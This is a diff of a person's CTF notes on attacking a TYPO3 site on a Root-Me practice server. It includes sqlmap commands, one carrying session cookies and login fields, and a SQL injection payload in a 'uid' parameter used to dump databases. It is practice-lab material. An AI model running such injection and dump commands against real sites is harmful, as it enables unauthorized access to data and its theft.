@@ -237,13 +237,10 @@ apparently the authors name is "Gary", email at gniemcew@yahoo.com
 
 
 http://ctf01.root-me.org/typo3/index.php --> admin login for typo3 cms.
-maybe try:
 
-sqlmap -u "http://ctf01.root-me.org/typo3/install/index.php" --cookie='be_typo_user=93681b30e4ff6e36c2ae6e2143888b1a; PHPSESSID=67b0a378b6b04c87e2e7766e254feb46' --data='login_status=login&username=admin&p_field=password&commandLI=Log+In&userident=82c734f68f0bc7f072ead9b06136b09c&challenge=a9ce338431caa906010775b2e4c61f4f&redirect_url=backend.php&loginRefresh=1&interface=backend' --dbms=mysql --dump, but
 page shows:
 The Install Tool is locked.
 
-sqlamp -u "http://ctf01.root-me.org/typo3/install/index.php"
 
 Fix: Create a file typo3conf/ENABLE_INSTALL_TOOL
 This file may simply be empty.
@@ -253,6 +250,8 @@ or delete the file after the operation is finished.
 
 If the file is older than 1 hour TYPO3 has automatically
 deleted it, so it needs to be created again.
+
+no way I can change that file unless I can get to the directory...
 
 ok let's try again
 
@@ -264,8 +263,10 @@ http://ctf01.root-me.org/typo3/sysext/felogin/pi1/class.tx_felogin_pi1.php --> d
 cannot access http://ctf01.root-me.org/typo3conf/, even with tamper data
 
 
+
 SQLMAP TIME:
-a friend helped me identify the exact URL needed for sqlmap:
+
+playing with the URL lead to a viable sql injection. A friend suggested adding "uid" param:
 
 root@kdog:~/ctf_shit/ubuntu_8.04# sqlmap -u 'http://ctf01.root-me.org/index.php?id=4&uid=-1%20OR%2017-7%3d10' --dbs --dump
 
